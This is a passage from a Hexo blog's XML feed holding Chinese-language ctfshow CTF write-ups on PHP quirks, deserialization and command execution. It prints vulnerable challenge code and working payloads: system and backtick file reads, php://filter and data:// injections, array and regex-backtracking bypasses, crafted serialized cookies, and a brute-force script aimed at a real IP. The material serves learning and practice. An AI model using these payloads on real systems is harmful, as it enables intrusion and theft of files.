        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2021/08/22/php%E7%89%B9%E6%80%A7/"/>
      <url>/2021/08/22/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在url中输入空格与.可以转换成_,所以如果我们想要获取CTF_SHOW.COM，是无法获取到的，只能进行爆破</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init(); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);<span class="comment">//true 时会发送 POST 请求</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$response</span>);</span><br><span class="line"><span class="keyword">return</span> strlen(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://139.224.40.131/test2.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.urlencode(chr(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>;</span><br><span class="line"><span class="variable">$num</span>=curl(<span class="variable">$url</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$i</span>).<span class="string">&quot;+&quot;</span>.urlencode(<span class="variable">$j</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到CTF[SHOW.COM，传入进去是CTF.SHOW.COM</p><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这道题目是用到了上一道题目的知识点，因为要使得$ctf_show===’ilove36d’。$url是我们输出的参数以及参数值</p><p><img src="1.png" alt="image-20211204232652674"></p><p>但是可以看到waf是允许出现<em>的，但是我们知道当我们传入的参数包括<code>.</code>,<code>空格</code>的时候，url会自动转化为\</em>,于是可以通过这个特性，以及extract变量覆盖得到flag</p><hr><h2 id="特性：传参中含有-空格会自动转化为"><a href="#特性：传参中含有-空格会自动转化为" class="headerlink" title="特性：传参中含有.,空格会自动转化为_"></a>特性：传参中含有<code>.</code>,<code>空格</code>会自动转化为<code>_</code></h2><hr><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>call_user_func的第一个参数要么是字符串，该字符串是已知的方法，要么是数组，至少有两个元素。因为有preg_match我的第一个想法是f1传入数组来绕过preg_match,然后传入DirectoryIterator以及current想来查看下目录，但是没有成功</p><blockquote><p><strong>Warning</strong>: call_user_func() expects parameter 1 to be a valid callback, non-static method DirectoryIterator::__toString() cannot be called statically in <strong>/www/wwwroot/xxx/test3.php</strong> on line <strong>10</strong></p></blockquote><p>没有找到合适的静态方法，于是失败</p><hr><h2 id="特性：-是一个函数"><a href="#特性：-是一个函数" class="headerlink" title="特性： _()是一个函数"></a>特性： _()是一个函数</h2><p>_()==gettext() 是gettext()的拓展函数</p><p><img src="2.png" alt="image-20211205100128907"></p><p>该函数返回在翻译表中找到的提交的字符串的信息，如果没有找到则返回提交的信息</p><hr><p>最后构造f1=_&amp;f2=get_defined_vars得到flag</p><blockquote><p>get_defined_vars:返回由所有已定义变量所组成的数组</p></blockquote><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做题目的时候也不知道自己想到哪里了</p><p>readfile读取文件并写入缓冲区，因为flag在flag.php里面，但是又必须要含有ctfshow，于是我们可以构造</p><blockquote><p>f=/ctfshow/../var/html/www/flag.php</p><p>/ctfshow/读取根目录下ctfshow中的内容，然后使用../回到根目录（这里的../可以多加几个，因为根目录的../还是根目录）,然后通过路径读取到flag.php</p><p>stripos:查找字符串第一次出现的位置</p></blockquote><hr><p>目录穿越漏洞原理：</p><p>在如下配置中设置目录别名时/files配置为/home/的别名，那么当我们访问/files../时，nginx实际处理的路径时/home/../从而实现了目录穿越</p><hr><h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目没啥好说的，直接正则回溯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;a&#x27;</span>*<span class="number">1000002</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>然后传参即可</p><p>emm，还有一种做法</p><p>?f[]=ctfshow</p><hr><h2 id="特性：preg-match数组绕过-preg-match输入数组返回false"><a href="#特性：preg-match数组绕过-preg-match输入数组返回false" class="headerlink" title="特性：preg_match数组绕过,preg_match输入数组返回false"></a>特性：preg_match数组绕过,preg_match输入数组返回false</h2><h2 id="特性：stripos（）输入数组返回的是null"><a href="#特性：stripos（）输入数组返回的是null" class="headerlink" title="特性：stripos（）输入数组返回的是null"></a>特性：stripos（）输入数组返回的是null</h2><hr><h2 id="特性：正则回溯"><a href="#特性：正则回溯" class="headerlink" title="特性：正则回溯"></a>特性：正则回溯</h2><p>有两种模式：一种是贪婪模式，一种是非贪婪模式</p><p>原理：如果回溯次数超过默认上限，则返回false，默认上限是1000000</p><hr><h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><p>同上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目主要是考查对&amp;&amp;，||执行顺序的了解</p><hr><h2 id="特性：x-amp-amp-y-如果x为false则不继续向下执行。x-y只有在x为false的情况下才可以执行"><a href="#特性：x-amp-amp-y-如果x为false则不继续向下执行。x-y只有在x为false的情况下才可以执行" class="headerlink" title="特性：x&amp;&amp;y,如果x为false则不继续向下执行。x||y只有在x为false的情况下才可以执行"></a>特性：x&amp;&amp;y,如果x为false则不继续向下执行。x||y只有在x为false的情况下才可以执行</h2><hr><blockquote><p>mt_rand（1,0x36d）是返回1到0x36d之间的随机数</p></blockquote><p>构造payload:?username=admin&amp;code=admin&amp;password=admin即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021-8-22</title>
      <link href="/2021/08/22/2021-8-22/"/>
      <url>/2021/08/22/2021-8-22/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2021/07/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/"/>
      <url>/2021/07/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>感觉反序列化又不会了。。。</p><span id="more"></span><h2>web 255</h2><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username=&#39;xxxxxx&#39;;    public $password=&#39;xxxxxx&#39;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><p>在cookie里面，进行反序列化</p><pre><code>class ctfShowUser（）&#123;    public $isVip=true;&#125;echo(urlencode(new ctfShowUser（）));</code></pre><p>然后 get传递参数</p><p>username=xxxxxx&amp;password=xxxxxx</p><h2>web 256</h2><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username=&#39;xxxxxx&#39;;    public $password=&#39;xxxxxx&#39;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><p>payload:</p><?php    class ctfShowUser{        public $isVip=true;         public $username='1';        public $password='2';     }    $a=new ctfShowUser();    echo(serialize($a));然后 get传递参数username=1&password=2]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行再探究</title>
      <link href="/2021/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%8D%E6%8E%A2%E7%A9%B6/"/>
      <url>/2021/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%8D%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>这次想把东西搞会搞懂</p><span id="more"></span><h2>一些常用的函数</h2><pre><code>system()  执行命令passthru()exec()shell_exec()popen()pcntl_exec()反引号  同shell_exec()eval()  执行命令show_source() 高亮显示文件highlight_file()  高亮显示文件array_reverse()  反向输出元素pos()  输出当前元素的值localeconv()  返回一包含本地数字及货币格式信息的数组include  一般用于括号被过滤的情况，因为可以不用括号require  一般用于括号被过滤的情况，因为可以不用括号echo()  输出next()  下一个元素&lt;?php$people = array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);echo current($people) . &quot;&lt;br&gt;&quot;; // 当前元素是 Billecho next($people) . &quot;&lt;br&gt;&quot;; // Bill 的下一个元素是 Steveecho current($people) . &quot;&lt;br&gt;&quot;; // 现在当前元素是 Steveecho prev($people) . &quot;&lt;br&gt;&quot;; // Steve 的上一个元素是 Billecho end($people) . &quot;&lt;br&gt;&quot;; // 最后一个元素是 Davidecho prev($people) . &quot;&lt;br&gt;&quot;; // David 之前的元素是 Markecho current($people) . &quot;&lt;br&gt;&quot;; // 目前的当前元素是 Markecho reset($people) . &quot;&lt;br&gt;&quot;; // 把内部指针移动到数组的首个元素，即 Billecho next($people) . &quot;&lt;br&gt;&quot;; // Bill 的下一个元素是 Steveprint_r (each($people)); // 返回当前元素的键名和键值（目前是 Steve），并向前移动内部指针?&gt;</code></pre><h2>web29</h2><p>eval是代码执行函数，所以我们需要输入一段php代码</p><p>?c=system(‘cat fla?.php’);</p><p>?是占位符，表示代替一个任意字符，也可以用<em>代替，</em>表示代替一个或多个任意字符</p><pre><code>echo `nl fl&#39;&#39;ag.php`;</code></pre><p>题目给的hint是这个，以前总是不理解这是什么意思，就是说 ``,是命令置换的意思，也就是说，shell先执行了反引号里面的命令，然后将命令的输出结果先保存起来了，然后我们采用echo将其输出</p><p>eval在我理解尚就是说相当于一个php的编译器，执行里面的代码，所以要用；结尾，表示一个完整的php语句。可以用单引号分隔来绕过过滤，如果想要在system里面使用单引号，需要system(“nl fla’’g.php”);</p><p>这里面file_get_contents,highlight_file,readfile都不能使用</p><p>然后在php代码的最后一行代码可以不用分号，所以当遇到代码执行的时候我们可以用<code>？&gt;</code>来代替分号</p><p>所以我们可以输入system（‘nl fla?.php’）?&gt;来代替分号</p><p>我们还可以使用cp命令，system(“cp fla*.php 1.txt”);将flag.php复制到1.txt</p><h2>web 30</h2><p>过滤system，flag，php，我们可以使用echo命令</p><pre><code>echo `nl f*`;</code></pre><p>然后echo可以用短标签代替&lt;?=，所以我们可以输入命令    </p><pre><code>?&gt;&lt;?=`nl f*`;</code></pre><p>然后我们还可以使用</p><pre><code>`cp fla* 1.txt`;</code></pre><h2>web 31</h2><p>采用了一个新的方法</p><pre><code>include(&quot;$_GET[1]&quot;);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php（这样里面不会出现空格）eval(&quot;$_GET[1]&quot;);&amp;1=system(&quot;cat flag.php&quot;);//上面两种方法还是说明了那个eval是代码执行，可以执行一段代码</code></pre><p>不知道为啥这道题目空格绕过不成功，群主给的hint是无参数rce</p><p>先看位置</p><p>print_r(scandir(‘.’))-&gt;print_r(scandir(current(localeconv())));</p><p>在倒数第二位</p><p>然后使用</p><p>show_source(next(array_reverse(scandir(current(localconv())))));</p><p>如果不是无参数rce我们还可以使用这个print_r(scandir(dirname(<strong>FILE</strong>)));（dirname(<strong>FILE</strong>)返回脚本所在的目录）</p><h2></h2><p>这里学到了一个小tips，include是可以不要（）的</p><p>include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php phpinfo();?></p><p>可以采用data协议</p><p>看群主的视频是在include%0a$_GET[1]?&gt;，也可以使用require%0a$_GET[1]?&gt;</p><p>但是在我电脑上一直没有能成，我感觉是空格的问题，在bp上应该可以，然后那个require也可以，不用用括号，空格</p><h2>wen 32,33，34，35，36同上</h2><p>语言结构有：echo,print,isset,unset,include,require这几种，这些是不需要括号的</p><p>并且$_GET[a],这里面的a是不需要有单引号的，原因是php向下兼容。以后这种写法可能会被取消</p><h2>web 37</h2><pre><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8+</code></pre><p>data协议，就是data协议就是将后面的字符或字符串当时php代码来执行</p><p>我一开始想的是?c=$_GET[1]&amp;1=/etc/passwd但是没有成功，原因是include将$_GET[1]当成了字符串来执行，不能将其及进行解析</p><h2>web 38</h2><p>用那个data，base64的依然可以，然后用短标签也可以绕过</p><h2>web 39</h2><p>依然是data伪协议</p><p>为什么会在界面商返回了1.php是因为phpinfo（）；的返回值是1，所以返回了1.php</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
